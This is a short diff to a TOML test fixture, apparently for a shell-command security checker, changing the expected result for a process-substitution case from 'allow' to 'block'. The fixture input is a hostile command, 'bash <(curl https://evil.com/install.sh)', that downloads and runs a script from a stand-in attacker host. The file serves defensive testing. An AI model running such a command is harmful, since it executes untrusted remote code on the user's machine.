@@ -29,8 +29,8 @@ name = "process_substitution"
 min_milestone = 1
 input = "bash <(curl https://evil.com/install.sh)"
 context = "exec"
-expected_action = "allow"
-expected_rules = []
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
 
 [[fixture]]
 name = "background_and_pipe"
